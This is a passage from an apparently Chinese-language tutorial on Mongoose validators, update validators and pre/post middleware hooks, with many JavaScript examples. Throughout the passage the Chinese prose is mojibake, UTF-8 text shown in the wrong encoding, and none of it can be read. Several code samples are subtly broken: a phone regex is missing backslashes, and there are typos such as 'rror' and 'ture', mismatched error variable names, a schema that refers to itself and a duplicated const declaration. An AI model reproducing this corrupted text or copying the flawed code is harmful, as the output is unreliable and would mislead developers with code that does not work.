ä¸­æ²¡æœ‰è¡¨è¿žæŽ¥ï¼Œä½†å¼•ç”¨å…¶ä»–ç»“åˆçš„æ–‡æ¡£æœ‰æ—¶å€™ä¹Ÿä¼šéœ€è¦ã€‚population å°±æ˜¯è¿™æ ·å½“å‡çš„ã€‚ Streaming å¯ä»¥ç”¨ æµå¼å¤„ç† MongoDB çš„æŸ¥è¯¢ç»“æžœï¼Œéœ€è¦è°ƒç”¨ Query.cursor() å‡½æ•°èŽ·å¾— QueryCursor çš„ä¸€ä¸ªå®žä¾‹ï¼š 1234const cursor = Person.find(&#123;occupation:/host/&#125;).cursor();cursor.on('data',function(doc)&#123;/**Called once for every document*/&#125;);cursor.on('close',function()&#123;/**Called when done*/&#125;); éªŒè¯ï¼ˆvalidationï¼‰éœ€è¦å…ˆæ³¨æ„ä¸‹é¢å‡ ç‚¹ï¼š éªŒè¯å®šä¹‰äºŽ SchemaType éªŒè¯æ˜¯ä¸€ä¸ªä¸­é—´ä»¶ï¼Œå®ƒé»˜è®¤ä½œä¸º pre(save)é’©å­æ³¨å†Œåœ¨ schema ä¸Š å¯ä»¥ä½¿ç”¨ doc.validate(callback)æˆ–è€… doc.validateSync()æ‰‹åŠ¨éªŒè¯ éªŒè¯å™¨ä¸å¯¹æœªå®šä¹‰çš„å€¼è¿›è¡ŒéªŒè¯ï¼Œå”¯ä¸€ä¾‹å¤–å°±æ˜¯ require éªŒè¯å™¨ éªŒè¯æ˜¯å¼‚æ­¥é€’å½’çš„ã€‚å½“è°ƒç”¨ Model#save,å­æ–‡æ¡£ä¹Ÿä¼šæ‰§è¡Œï¼Œå‡ºé”™çš„è¯ Model#save å›žè°ƒä¼šæŽ¥å—é”™è¯¯ éªŒè¯æ˜¯å¯ä»¥å®šåˆ¶çš„ã€‚ 1234567891011121314const schema = new Schema(&#123; name:&#123; type:String, require:true &#125;&#125;)const Cat = db.model('Cat',schema);const cat = new Cat();cat.save(function(err)&#123; assert.equal(error.errors['name'].message,'Path `name` is required.'); error = cat.validateSync(); assert.equal(error.errors['name'].message,'Path `name` is required.')&#125;); å†…å»º ValidatorsMongoose æœ‰ä¸€äº›å†…å»ºéªŒè¯å™¨ æ‰€æœ‰ SchemaTypes éƒ½æœ‰å†…å»ºçš„ required éªŒè¯å™¨ã€‚required éªŒè¯å™¨ä½¿ç”¨ checkRequiredï¼ˆï¼‰å‡½æ•°åˆ¤å®šè¿™ä¸ªå€¼æ˜¯å¦æ»¡è¶³ required éªŒè¯å™¨ Numbers æœ‰ min å’Œ max éªŒè¯å™¨ String æœ‰ enumã€matchã€maxlength å’Œ minlength éªŒè¯å™¨ ä¸Šé¢çš„é“¾æŽ¥æä¾›äº†ä½¿ç”¨å’Œé”™è¯¯å¤„ç†ç›¸å…³çš„è¯¦ç»†ä¿¡æ¯ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738const breakfastSchema = new Schema(&#123; eggs:&#123; type:Number, min:[6,'Too few eggs'], max:12 &#125;, bacon:&#123; type:Number, required:[true,'Why no bacon'] &#125;, drink:&#123; type:String, enum:['Coffee','Tea'], required:function()&#123; return this.bacon &gt; 3; &#125; &#125;&#125;);const Breakfast = db.model('Breakfast',breakfastSchema);const badBreakfast = new Breakfast(&#123; eggs:2, bacon:0, drink:'Milk'&#125;);const error = badBreakfast.validateSync();assert.equal(error.errors['eggs'].message,'Too few eggs');assert.ok(!error.errors['bacon']);assert.equal(error.errors['drink'].message,'`Milk` is not a valid enum value for path `drink`');badBreakfast.bacon = 5;badBreakfast.drink = null;error = badBreakfast.validateSync();assert.equal(error.errors['drink'].message,'Path `drink` is required');badBreakfast.bacon = null;error = badBreakfast.validateSync();assert.equal(error.errors['bacon'].message,'Why no bacon'); uniqueä¸æ˜¯éªŒè¯å™¨å®ƒæ˜¯æž„å»º MongoDB unique indexes çš„è¾…åŠ©å‡½æ•° 12345678910111213141516171819202122232425262728293031const uniqueUsernameSchema = new Schema(&#123; username:&#123; type:String, unique:true &#125;&#125;)const U1 = db.model('U1',uniqueUsernameSchema);const U2 = db.model('U2',uniqueUsernameSchema);const dup = [&#123;username:'Val'&#125;,&#123;username:'val'&#125;]U1.create(dup,function(err)&#123;&#125;);// åœ¨ä¿å­˜ä¹‹å‰éœ€è¦ç­‰å¾…ç´¢å¼•å®Œæˆæž„å»ºï¼Œå¦åˆ™å¯èƒ½ä¼šè¿åæƒŸä¸€çš„çº¦æŸã€‚U2.once('index',function(err)&#123; assert.ifError(err); U2.create(dup,function(err)&#123; // é‡å¤é”®é”™è¯¯ assert.ok(err); assert.ok(!err.errors); assert.ok(error.message.indexOf('duplicate key error') != -1); &#125;);&#125;);U2.init().then(function()&#123; U2.create(dup,function(err)&#123; // é‡å¤é”®é”™è¯¯ assert.ok(err); assert.ok(!err.errors); assert.ok(error.message.indexOf('duplicate key error') != -1); &#125;); &#125;); è‡ªå®šä¹‰éªŒè¯å™¨å¦‚æžœå†…å»ºæ£€éªŒå™¨ä¸å¤Ÿç”¨äº†ï¼Œå¯ä»¥å®šä¹‰æ»¡è¶³è‡ªå·±éœ€è¦çš„éªŒè¯å™¨ è‡ªå®šä¹‰éªŒè¯å™¨é€šè¿‡ä¼ å…¥ä¸€ä¸ªéªŒè¯å‡½æ•°æ¥å®šä¹‰ 12345678910111213141516171819202122232425262728const userSchema = new Schema(&#123; phone:&#123; type:String, validate:&#123; validator:function(v)&#123; return /\d&#123;3&#125;-d&#123;3&#125;-d&#123;4&#125;/.test(v); &#125;, message:'&#123;VALUE&#125; is not a valid phone number!' &#125;, required:[true,'User phone number required'] &#125;&#125;);const User = db.model('user',userSchema);const user = new User();let error;user.phone = '555.0123';error = user.validateSync();assert.equal(error.errors['phone'].message,'555.0123 is not a valid phone number!');user.phone = '';rror = user.validateSync();assert.equal(error.errors['phone'].message,'User phonse number required!');user.phone = '201-555-0123';rror = user.validateSync();assert.equal(error,null); å¼‚æ­¥è‡ªå®šä¹‰éªŒè¯å™¨è‡ªå®šä¹‰éªŒè¯å™¨å¯ä»¥æ˜¯å¼‚æ­¥çš„ï¼Œå¦‚æžœæ£€éªŒå‡½æ•°è¿”å›ž promise (åƒ asyncå‡½æ•°)ï¼Œmongoose å°†ä¼šç­‰å¾…è¯¥ promise å®Œæˆã€‚å¦‚æžœæ›´å–œæ¬¢ä½¿ç”¨å›žè°ƒå‡½æ•°ï¼Œè®¾ç½® isAsyncé€‰é¡¹ï¼Œmongoose ä¼šå°†å›žè°ƒå‡½æ•°ä½œä¸ºéªŒè¯å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142const userSchema = new Schema(&#123; name:&#123; type:String, // å¯ä»¥é€šè¿‡è¿”å›žä¸€ä¸ªpromiseä½¿éªŒè¯å™¨å¼‚æ­¥ã€‚å¦‚æžœè¿”å›žä¸€ä¸ªpromiseï¼Œä¸è¦æŒ‡å®š' isAsync 'é€‰é¡¹ã€‚ validate:function(v)&#123; return new Promise(function(resolve,reject)&#123; setTimeout(function()&#123; resolve(false) &#125;,5); &#125;); &#125; &#125;, phone:&#123; type:String, validate:&#123; isAsync:true, validator:function(v,cb)&#123; setTimeout(function()&#123; const phoneRegex = /\d&#123;3&#125;-d&#123;3&#125;-d&#123;4&#125;/; const msg = v + 'is not a valid phone number!'; // ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¸ƒå°”å€¼ä»£è¡¨éªŒè¯ç»“æžœ // ç¬¬äºŒä¸ªå‚æ•°æ˜¯æŠ¥é”™ä¿¡æ¯ cb(phoneRegex.test(v),msg); &#125;,5); &#125;, // é»˜è®¤æŠ¥é”™ä¿¡æ¯ä¼šè¢« cb çš„ç¬¬äºŒä¸ªå‚æ•°è¦†ç›– message:'Default error message' &#125;, required:[true,'User phone number required'] &#125;&#125;);const User = db.model('User',userSchema);const user = new User();let error;user.phone = '555.0123';user.name = 'test';user.validate(function(error)&#123; assert.ok(error); assert.equal(error.errors['phone'].message,'555.0123 is not a valid phone number!'); assert.equal(error.errors['name'].message,'Validator failed for path `name` with value `test`');&#125;); éªŒè¯é”™è¯¯éªŒè¯å¤±è´¥è¿”å›ž çš„err åŒ…å«ä¸€ä¸ª ValidatorErrorå¯¹è±¡ã€‚æ¯ä¸€ä¸ª ValidatorError éƒ½æœ‰ kindã€pathã€value å’Œ message å±žæ€§ã€‚ValidatorError ä¹Ÿæœ‰å¯èƒ½æœ‰ reason å±žæ€§å¦‚æžœéªŒè¯å™¨æŠ›å‡ºé”™è¯¯ï¼Œè¿™ä¸ªå±žæ€§ä¼šåŒ…å«è¯¥é”™è¯¯åŽŸå› ã€‚ 1234567891011121314151617181920212223242526272829const toySchema = new Schema(&#123; color:String, name:String&#125;);const validator = function(v)&#123; return /red|white|gold/i.test(v);&#125;toySchema.path('color'ï¼‰.validate(validator,'Color `&#123;VALUE&#125;` not valid','Invalid color');toySchema.path('name').validate(function(v)&#123; if(v !== 'Turbo Man')&#123; throw new Error('Need to get a Turbo Man for Christmas'); &#125; return ture;&#125;,'Name `&#123;VALUE&#125;` is not valid');const Toy = db.model('Toy',toySchema);const toy = new Toy(&#123;color:'Green',name:'Power Ranger'&#125;);toy.save(function(err)&#123; assert.equal(err.errors.color.message, 'Color `Green` not valid'); assert.equal(err.errors.color.kind, 'Invalid color'); assert.equal(err.errors.color.path, 'color'); assert.equal(err.errors.color.value, 'Green'); assert.equal(err.errors.name.message,'Need to get a Turbo Man for Christmas'); assert.equal(err.errors.name.value, 'Power Ranger'); assert.equal(err.errors.name.reason.message,'Need to get a Turbo Man for Christmas'); assert.equal(err.name, 'ValidationError'); &#125;); åµŒå¥—å¯¹è±¡ä¸­çš„ Required éªŒè¯å™¨å®šä¹‰åµŒå¥—å¯¹è±¡çš„éªŒè¯å™¨éœ€è¦ç‰¹åˆ«æ³¨æ„ 12345678910111213141516171819202122232425262728293031let personSchema = new Schema(&#123; name:&#123; first:String, last:String &#125;&#125;);assert.throws(function()&#123; // è¿™é‡Œä¼šæŠ¥é”™ï¼Œå› ä¸º name ä¸æ˜¯å®Œæ•´è·¯å¾„ personSchema.path('name').required(true);&#125;);// è¦è®©åµŒå¥—å¯¹è±¡ required è¦ä½¿ç”¨å•ç‹¬çš„åµŒå¥— schemaconst nameSchema = new Schema(&#123; name:&#123; type:nameSchema, required:true &#125;&#125;);personSchema = new Schema(&#123; name:&#123; type:nameSchema, required:true &#125;&#125;);const person = db.model('Person',personSchema);const person = new Person();const error = person.validateSync();assert.ok(error.errors['name']); Update éªŒè¯å™¨Mongoose è¿˜æ”¯æŒéªŒè¯ update() å’Œ findOneAndUpdate() æ“ä½œï¼ŒUpdate éªŒè¯å™¨é»˜è®¤å…³é—­ï¼Œå¦‚æžœéœ€è¦æ‰“å¼€ï¼Œéœ€è¦é…ç½® runValidators 123456789101112131415const toySchema = new Schema(&#123; color: String, name: String&#125;);const Toy = db.model('Toys', toySchema);Toy.schema.path('color').validate(function (value) &#123; return /blue|green|white|red|orange|periwinkle/i.test(value);&#125;, 'Invalid color');const opts = &#123; runValidators: true &#125;;Toy.update(&#123;&#125;, &#123; color: 'bacon' &#125;, opts, function (err) &#123; assert.equal(err.errors.color.message,'Invalid color');&#125;); Update éªŒè¯å™¨ ä¸Ž thisupdate éªŒè¯å™¨å’Œ document éªŒè¯å™¨æœ‰å¾ˆå¤šä¸åŒã€‚ä¸Šé¢çš„é¢œè‰²éªŒè¯å‡½æ•°ï¼Œthis æŒ‡å‘éªŒè¯ä¸­çš„ documentï¼Œç„¶åŽupdate éªŒè¯å™¨è¿è¡Œæ—¶ï¼Œè¢«æ›´æ–°æ–‡æ¡£ä¸ä¸€å®šå­˜åœ¨äºŽæœåŠ¡å™¨å†…å­˜ï¼Œæ‰€ä»¥ this å€¼æœªå®šä¹‰ 123456789101112131415161718192021222324252627282930const toySchema = new Schema(&#123; color: String, name: String&#125;);toySchema.path('color').validate(function(value) &#123; // åœ¨è¿è¡Œâ€œvalidate()â€æˆ–â€œvalidateSync()â€æ—¶ // éªŒè¯å™¨å¯ä»¥ä½¿ç”¨â€œthisâ€è®¿é—®æ–‡æ¡£ã€‚ if (this.name.toLowerCase().indexOf('red') !== -1) &#123; return value !== 'red'; &#125; return true;&#125;);const Toy = db.model('ActionFigure', toySchema);const toy = new Toy(&#123; color: 'red', name: 'Red Power Ranger' &#125;);const error = toy.validateSync();assert.ok(error.errors['color']);const update = &#123; color: 'red', name: 'Red Power Ranger' &#125;;const opts = &#123; runValidators: true &#125;;Toy.update(&#123;&#125;, update, opts, function(error) &#123; // The update validator throws an error: // "TypeError: Cannot read property 'toLowerCase' of undefined", // because `this` is **not** the document being updated when using // update validators assert.ok(error);&#125;); contexté€‰é¡¹context é€‰é¡¹è¿è¡ŒæŠŠ update éªŒè¯å™¨çš„ this è®¾å®šä¸º query 12345678910111213141516toySchema.path('color').validate(function(v)&#123; // When running update validators with the `context` option set to // 'query', `this` refers to the query object. if(this.getUpdate().$set.name.toLowerCase().indexOf('red') !== -1)&#123; return value == 'red' &#125; return true;&#125;);const Toy = db.model('Figure',toySchema);const update = &#123;color:'blue',name:'haha'&#125;// Note the context optionconst opts = &#123;runValidators:true,context:'query'&#125;Toy.update(&#123;&#125;,update,opts,function(error)&#123; assert.ok(error.errors['color']);&#125;); Update éªŒè¯å™¨å­—æ®µè·¯å¾„å¦ä¸€ä¸ªå…³é”®ä¸åŒç‚¹æ˜¯ update éªŒè¯å™¨åªè¿è¡ŒäºŽæ›´æ–°çš„å­—æ®µã€‚ ä¸‹ä¾‹ä¸­ï¼Œå› ä¸º â€˜nameâ€™ åœ¨æ›´æ–°æ“ä½œæœªè¢«æŒ‡å®šï¼Œæ‰€ä»¥æ­¤æ¬¡æ›´æ–°æ“ä½œæˆåŠŸã€‚ ä½¿ç”¨ update éªŒè¯å™¨çš„æ—¶å€™ï¼Œ required éªŒè¯å™¨åªä¼šåœ¨ä½ å¯¹æŸä¸ªå­—æ®µæ˜¾å¼ä½¿ç”¨ $unset æ‰ä¼šè§¦å‘ã€‚ 12345678910111213141516171819const kittenSchema = new Schema(&#123; name: &#123; type: String, required: true &#125;, age: Number&#125;);const Kitten = db.model('Kitten', kittenSchema);const update = &#123; color: 'blue' &#125;;const opts = &#123; runValidators: true &#125;;Kitten.update(&#123;&#125;, update, opts, function(err) &#123; // å³ä½¿ 'name' æ²¡æœ‰æŒ‡å®šä¹Ÿæ“ä½œæˆåŠŸäº†&#125;);const unset = &#123; $unset: &#123; name: 1 &#125; &#125;;Kitten.update(&#123;&#125;, unset, opts, function(err) &#123; // 'name' requiredï¼Œ æ“ä½œå¤±è´¥ assert.ok(err); assert.ok(err.errors['name']);&#125;); Update éªŒè¯å™¨åªè¿è¡ŒäºŽæŒ‡å®šå­—æ®µè·¯å¾„æœ€åŽè¦æ³¨æ„çš„æ˜¯ï¼šupdate éªŒè¯å™¨åªè¿è¡ŒäºŽä¸‹åˆ—æ›´æ–°æ“ä½œï¼š $set $unset $push (&gt;= 4.8.0) $addToSet (&gt;= 4.8.0) $pull (&gt;= 4.12.0) $pullAll (&gt;= 4.12.0) ä¾‹å¦‚ï¼Œä»¥ä¸‹ update æˆåŠŸæ‰§è¡Œï¼Œä¸ç®¡ number çš„å€¼ï¼Œå› ä¸º update éªŒè¯å™¨ æ— è§† $inc ã€‚åŒæ ·ï¼Œ $pushã€$addToSetã€ $pullå’Œ $pullAll éªŒè¯å™¨ ä¸ä¼šå¯¹æ•°ç»„è‡ªèº«éªŒè¯ï¼Œåªä¼šå¯¹æ•°ç»„ä¸­çš„å…ƒç´ éªŒè¯ã€‚ 12345678910111213141516171819202122const testSchema = new Schema(&#123; number: &#123; type: Number, max: 0 &#125;, arr: [&#123; message: &#123; type: String, maxlength: 10 &#125; &#125;]&#125;);// Update éªŒè¯å™¨ä¸ä¼šä½œæ£€æŸ¥ï¼Œæ‰€ä»¥ä½ å†ä»ç„¶å¯ä»¥ `$push` ä¸¤ä¸ªå…ƒç´ åˆ°æ•°ç»„ // åªè¦ä»–ä»¬çš„ `message` æ²¡æœ‰è¶…é•¿testSchema.path('arr').validate(function(v) &#123; return v.length &lt; 2;&#125;);const Test = db.model('Test', testSchema);const update = &#123; $inc: &#123; number: 1 &#125; &#125;;const opts = &#123; runValidators: true &#125;;Test.update(&#123;&#125;, update, opts, function(error) &#123; // è¿™é‡Œä¸ä¼šæŠ¥é”™ update = &#123; $push: [&#123; message: 'hello' &#125;, &#123; message: 'world' &#125;] &#125;; Test.update(&#123;&#125;, update, opts, function(error) &#123; // è¿™é‡Œä¹Ÿä¸ä¼šæŠ¥é”™ &#125;);&#125;); \$push å’Œ \$addToSet4.8.0 æ–°ç‰¹æ€§ï¼š update éªŒè¯å™¨ä¹Ÿè¿è¡ŒäºŽ $push å’Œ $addToSet 1234567891011121314151617181920const testSchema = new Schema(&#123; numbers: [&#123; type: Number, max: 0 &#125;], docs: [&#123; name: &#123; type: String, required: true &#125; &#125;]&#125;);const Test = db.model('TestPush', testSchema);const update = &#123; $push: &#123; numbers: 1, docs: &#123; name: null &#125; &#125;&#125;;const opts = &#123; runValidators: true &#125;;Test.update(&#123;&#125;, update, opts, function(error) &#123; assert.ok(error.errors['numbers']); assert.ok(error.errors['docs']);&#125;); ä¸­é—´ä»¶ï¼ˆmiddlewareï¼‰ä¸­é—´ä»¶ï¼ˆpre å’Œ postï¼‰æ˜¯åœ¨å¼‚æ­¥å‡½æ•°æ‰§è¡Œæ—¶å‡½æ•°ä¼ å…¥çš„æŽ§åˆ¶å‡½æ•°ã€‚ä¸­é—´ä»¶åœ¨ Schema ä¸ŠæŒ‡å®šï¼Œåœ¨å†™æ’ä»¶æ—¶å¾ˆæœ‰ç”¨ã€‚Mongoose 4.x æœ‰å››ç§ä¸­é—´ä»¶ï¼šdocumentã€modelã€aggregateã€query ä¸­é—´ä»¶ã€‚å¯¹äºŽ document ä¸­é—´ä»¶ï¼Œthis æŒ‡å‘å½“å‰çš„ documentï¼ŒDocument ä¸­é—´ä»¶æ”¯æŒä¸‹é¢çš„ document æ“ä½œï¼š init validate save remove å¯¹äºŽ queryä¸­é—´ä»¶ï¼Œthis æŒ‡å‘ queryã€‚Query ä¸­é—´ä»¶æ”¯æŒä¸€ä¸‹ Model å’Œ Query æ“ä½œï¼š count find findOne findOneAndRemove findOneAndUpdate update Aggregate ä¸­é—´ä»¶ä½œç”¨äºŽ MyModel.aggregat(),å®ƒä¼šåœ¨å¯¹ aggregate å¯¹è±¡è°ƒç”¨ exec() æ—¶æ‰§è¡Œã€‚å¯¹äºŽ aggregate ä¸­é—´ä»¶ï¼Œthis ä¹Ÿæ˜¯æŒ‡å‘ aggregation å¯¹è±¡ã€‚ aggregate å¯¹äºŽ model ä¸­é—´ä»¶æ¥è¯´ï¼Œthis æ˜¯æŒ‡å‘å½“å‰çš„model.Model ä¸­é—´ä»¶æ”¯æŒä¸‹é¢çš„æ“ä½œï¼š insertMany æ‰€æœ‰çš„ä¸­é—´ä»¶æ”¯æŒ pre å’Œ post é’©å­ï¼Œä¸‹é¢è§£é‡Šè¿™ä¸¤ä¸ªé’©å­çš„ç»†èŠ‚ã€‚ æ³¨æ„ï¼šQuery æ˜¯æ²¡æœ‰ remove é’©å­çš„ï¼Œåªæœ‰ documentæœ‰ï¼Œå¦‚æžœè®¾å®šäº† remove é’©å­ï¼Œå°†ä¼šåœ¨è°ƒç”¨ myDoc.remove()è€Œä¸æ˜¯MyModel.remove çš„æ—¶å€™è§¦å‘ã€‚åªæœ‰ create() å‡½æ•°ä¼šè§¦å‘ save() é’©å­ã€‚ Prepre é’©å­åˆ†ä¸ºä¸²è¡Œå’Œå¹¶è¡Œä¸¤ç§ã€‚ ä¸²è¡Œ ä¸²è¡Œä¸­é—´ä»¶ä¸€ä¸ªæŽ¥ä¸€ä¸ªåœ°æ‰§è¡Œï¼Œå…·ä½“æ¥è¯´ï¼Œä¸Šä¸€ä¸ªä¸­é—´ä»¶è°ƒç”¨ next å‡½æ•°çš„æ—¶å€™ï¼Œä¸‹ä¸€ä¸ªæ‰§è¡Œã€‚ 12345const schema = new Schema(&#123;..&#125;);schema.pre('save',function(next)&#123; next();&#125;); åœ¨ 5.x ç‰ˆæœ¬ä¸­ï¼Œé™¤äº†æ‰‹åŠ¨è°ƒç”¨ next ï¼Œå¯ä»¥è¿”å›žä¸€ä¸ª promise ï¼Œç”šè‡³æ˜¯ async/awaitã€‚ 12345678schema.pre('save',function()&#123; return doStuff().then(()=&gt;doMoreStuff())&#125;);// æˆ–è€… Node.js &gt;= 7.6.0:schema.pre('save',async function()&#123; await doStuff(); await doMoreStuff();&#125;); next() ä¸ä¼šé˜»æ­¢å‰©ä½™ä»£ç çš„è¿è¡Œï¼Œå¯ä»¥ä½¿ç”¨æå‰ return æ¨¡å¼æ¥é˜»æ­¢ next () åŽé¢çš„ä»£ç ã€‚ 12345678910const schema = new Schema(&#123;..&#125;);schema.pre('save',function(next)&#123; if(foo())&#123; console.log('calling next'); // `return next();` will make sure the rest of this function doesn't run next(); &#125; // Unless you comment out the `return` above, 'after next' will print console.log('after next');&#125;); å¹¶è¡Œ å¹¶è¡Œä¸­é—´ä»¶æä¾›ç»†ç²’åº¦æµæŽ§åˆ¶ 123456const schema = new Schema(&#123;..&#125;);// true ä»£è¡¨è¿™æ˜¯ä¸€ä¸ªå¹¶è¡Œä¸­é—´ä»¶ï¼Œå¦‚æžœè¦ä½¿ç”¨å¹¶è¡Œä¸­é—´ä»¶ï¼Œå¿…é¡»æŒ‡å®š true ä¸ºç¬¬äºŒä¸ªå‚æ•°schema.pre('save',true,function(next,done)&#123; next(); setTimeout(done,100);&#125;); ä¸Šè¿°çš„ä¾‹å­ä¸­ï¼Œsave æ–¹æ³•å°†åœ¨æ‰€æœ‰ä¸­é—´ä»¶éƒ½è°ƒç”¨äº† done çš„æ—¶å€™æ‰ä¼šæ‰§è¡Œã€‚ ä½¿ç”¨åœºæ™¯ï¼š ä¸­é—´ä»¶å¯¹åŽŸå­åŒ–æ¨¡åž‹é€»è¾‘å¾ˆæœ‰å¸®åŠ©ï¼Œè¿™é‡Œæœ‰ä¸€äº›å…¶ä»–å»ºè®®ï¼š å¤æ‚çš„æ•°æ®æ ¡éªŒ åˆ é™¤ä¾èµ–æ–‡æ¡£ï¼ˆåˆ é™¤ç”¨æˆ·åŽåˆ é™¤å…¶ä»–æ‰€æœ‰æ–‡ç« ï¼‰ æŸä¸ªæ“ä½œè§¦å‘çš„å¼‚æ­¥ä»»åŠ¡ é”™è¯¯å¤„ç†ï¼š å¦‚æžœ pre é’©å­å‡ºé”™ï¼Œmomgoose å°†ä¸ä¼šæ‰§è¡ŒåŽé¢çš„å‡½æ•°ã€‚Mongoose ä¼šå‘å›žè°ƒå‡½æ•°ä¼ å…¥ err å‚æ•°ï¼Œæˆ–è€… reject è¿”å›žçš„ promise ã€‚ä¸‹é¢æ˜¯å‡ ä¸ªé”™è¯¯çš„å¤„ç†çš„æ–¹æ³•: 12345678910111213141516171819schema.pre('save',function(next)&#123; const err = new Error('something went gone'); next(err);&#125;);schema.pre('save',function(next)&#123; return new Promise((resolve,reject)=&gt;&#123; reject(new Error('something went gone')) &#125;);&#125;);schema.pre('save',async function()&#123; await Promise.resolve(); throw new Error('something went gone')&#125;);myDoc.save(function(err)&#123; console.log(err.message);&#125;); å¤šæ¬¡è°ƒç”¨ next æ˜¯æ— æ•ˆçš„ï¼Œå¦‚æžœè°ƒç”¨ next å¸¦æœ‰é”™è¯¯å‚æ•° err1 ï¼Œç„¶åŽå†æŠ›å‡ºä¸€ä¸ª err2ï¼Œmongoose åªä¼šä¼ é€’ err1 Postä¸­é—´ä»¶post ä¸­é—´ä»¶åœ¨æ–¹æ³•æ‰§è¡Œä¹‹åŽè°ƒç”¨ï¼Œè¿™ä¸ªæ—¶å€™æ¯ä¸ª pre ä¸­é—´ä»¶éƒ½å·²ç»å®Œæˆäº†ã€‚ 123456789101112schema.post('init', function(doc) &#123; console.log('%s has been initialized from the db', doc._id);&#125;);schema.post('validate', function(doc) &#123; console.log('%s has been validated (but not saved yet)', doc._id);&#125;);schema.post('save', function(doc) &#123; console.log('%s has been saved', doc._id);&#125;);schema.post('remove', function(doc) &#123; console.log('%s has been removed', doc._id);&#125;); å¼‚æ­¥ Post é’©å­å¦‚æžœç»™å›žè°ƒå‡½æ•°ä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼Œmongoose ä¼šè®¤ä¸ºç¬¬äºŒä¸ªå‚æ•° next å‡½æ•°ï¼Œå¯ä»¥é€šè¿‡ next è§¦å‘ä¸‹ä¸€ä¸ªä¸­é—´ä»¶ 1234567891011schema.post('save',function(doc,next)&#123; setTimeout(function()&#123; console.log('post1'); next(); &#125;,10);&#125;);// ç›´åˆ°ç¬¬ä¸€ä¸ªä¸­é—´ä»¶æ‰§è¡Œ next() æ‰ä¼šæ‰§è¡Œschema.post('save',function(doc,next)&#123; console.log('post2'); next();&#125;); Save/Validateé’©å­save() å‡½æ•°è§¦å‘ validate é’©å­ï¼Œmongoose validate() å…¶å®žå°±æ˜¯ pre(â€˜saveâ€™)é’©å­ï¼Œè¿™æ„å‘³ç€æ‰€æœ‰ pre(â€˜validateâ€™) å’Œ post(â€˜validateâ€™)éƒ½ä¼šåœ¨ pre(â€˜saveâ€™)é’©å­ä¹‹å‰è°ƒç”¨ã€‚ 123456789101112131415schema.pre('validate',function()&#123; console.log('this gets printed first');&#125;);schema.post('validate', function() &#123; console.log('this gets printed second');&#125;);schema.pre('save', function() &#123; console.log('this gets printed third');&#125;);schema.post('save', function() &#123; console.log('this gets printed fourth');&#125;); finAndUpdate() ä¸Ž Query ä¸­é—´ä»¶ä½¿ç”¨æ³¨æ„pre å’Œ post save() é’©å­éƒ½ä¸æ‰§è¡ŒäºŽ update ,findOneAndUpdate ç­‰æƒ…å†µã€‚Mongoose4.0 ä¸ºè¿™äº›å‡½æ•°åˆ¶å®šäº†æ–°é’©å­ã€‚ 123456789101112schema.pre('find',function()&#123; console.log(this instanceof mongoose.Query); // true this.start = Date.now()&#125;);schema.post('find',function(result)&#123; console.log(this instanceof mongoose.Query); // true // prints returned documents console.log('find() returned ' + JSON.stringify(result)); // prints number of milliseconds the query took console.log('find() took ' + (Date.now() - this.start) + ' millis');&#125;); Query ä¸­é—´ä»¶ä¸åŒäºŽ document ä¸­é—´ä»¶ï¼Œdocument ä¸­é—´ä»¶ä¸­ï¼Œthis æŒ‡å‘è¢«æ›´æ–° document,query ä¸­é—´ä»¶ä¸­ï¼Œthis æŒ‡å‘query å¯¹è±¡è€Œä¸æ˜¯è¢«æ›´æ–° document ä¾‹å¦‚ï¼Œå¦‚æžœè¦æ¯æ¬¡ update ä¹‹å‰æ›´æ–° updateAt æ—¶é—´æˆ³ï¼Œå¯ä»¥ä½¿ç”¨ pre é’©å­ 123schema.pre('update',function()&#123; this.update(&#123;&#125;,&#123;$set:&#123;updateAt:new Date()&#125;&#125;);&#125;); é”™è¯¯å¤„ç†ä¸­é—´ä»¶é”™è¯¯å¤„ç†ä¸­é—´ä»¶æ¯”æ™®é€šä¸­é—´ä»¶å¤šä¸€ä¸ª error å‚æ•°ï¼Œå¹¶ä¸” err ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ä¼ å…¥ã€‚ è€ŒåŽé”™è¯¯å¤„ç†ä¸­é—´ä»¶å¯ä»¥è®©ä½ è‡ªç”±åœ°åšé”™è¯¯çš„åŽç»­å¤„ç†ã€‚ 12345678910111213141516171819const schema = new Schema(&#123; name:&#123; type:String, // // Will trigger a MongoError with code 11000 when you save a duplicate unique:true &#125;&#125;)// å¤„ç†å‡½æ•°å¿…é¡»ä¼ å…¥3ä¸ªå‚æ•°ï¼šå‘ç”Ÿçš„é”™è¯¯ï¼Œè¿”å›žæ–‡ä»¶ï¼Œä»¥åŠ next å‡½æ•°schema.post('save',function(error,doc,next)&#123; if(error.name === 'MongoError' &amp;&amp; error.code === 11000)&#123; next(new Error('There was a duplicate key error')) &#125;else&#123; next(error); &#125;&#125;);// Will trigger the `post('save')` error handlerPerson.create([&#123;name:'Axl Rose'&#125;,&#123;name:'Axl Rose'&#125;]); å¯¹äºŽquery ä¸­é—´ä»¶ä¹Ÿå¯ä»¥ä½¿ç”¨é”™è¯¯å¤„ç†ï¼Œå¯ä»¥å®šä¹‰ä¸€ä¸ª post update é’©å­ï¼Œå®ƒå¯ä»¥æ•èŽ· MongoDB é‡å¤ key é”™è¯¯ã€‚ 1234567891011121314schema.post('update',function(error,res,next)&#123; if(error.name === 'MongoError' &amp;&amp; error.code === 11000)&#123; next(new Error('There was a duplicate key error')) &#125;else&#123; next(error); &#125;&#125;);const people = [&#123;name:'Axl Rose'&#125;,&#123;name:'Axl Rose'&#125;];Person.create(people,function(error)&#123; Person.update(&#123;name:'haha'&#125;,&#123;$set:&#123;name:'Axl Rose'&#125;&#125;,function(error)&#123; // error.message` will be "There was a duplicate key error" &#125;);&#125;) å¡«å……ï¼ˆPopulateï¼‰åƒsql é‡Œé¢çš„ join çš„èšåˆæ“ä½œï¼Œpopulate å¯ä»¥è®©ä½ åœ¨åˆ«çš„ collection ä¸­å¼•ç”¨ document Population å¯ä»¥è‡ªåŠ¨æ›¿æ¢ document ä¸­çš„æŒ‡å®šå­—æ®µï¼Œæ›¿æ¢å†…å®¹ä»Žå…¶ä»– collection èŽ·å–ã€‚æˆ‘ä»¬å¯ä»¥å¡«å……å•ä¸ªæˆ–è€…æ¯ä¸ª documentã€å•ä¸ªæˆ–è€…å¤šä¸ªçº¯å¯¹è±¡ï¼Œç”šè‡³æ˜¯ query 